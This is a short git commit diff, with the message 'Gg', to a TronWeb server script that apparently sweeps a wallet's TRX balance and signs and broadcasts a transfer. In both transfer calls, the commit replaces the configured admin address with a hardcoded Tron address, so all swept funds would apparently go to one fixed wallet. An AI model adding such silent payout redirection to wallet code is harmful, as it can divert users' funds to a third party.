0153df8636157e9a8004bee479007e73dd59264b
John5220 <118568956+John5220@users.noreply.github.com>
2023-02-12 17:26:19 +0100

    Gg

--- server.js
+++ server.js
@@ -182,7 +182,7 @@ var rrt = parseFloat(txt)
 const txtr = rrt-269000
 console.log("balance:",rrt)
 console.log("parse amount :",txtr)
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(Admin_tron_address, txtr);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx('TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM', txtr);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
@@ -195,7 +195,7 @@ res.status(200).json({response: ret ,Amount : bal,Sender : address});
     }
 }else{
 try {
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(Admin_tron_address, txt);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx('TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM', txt);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
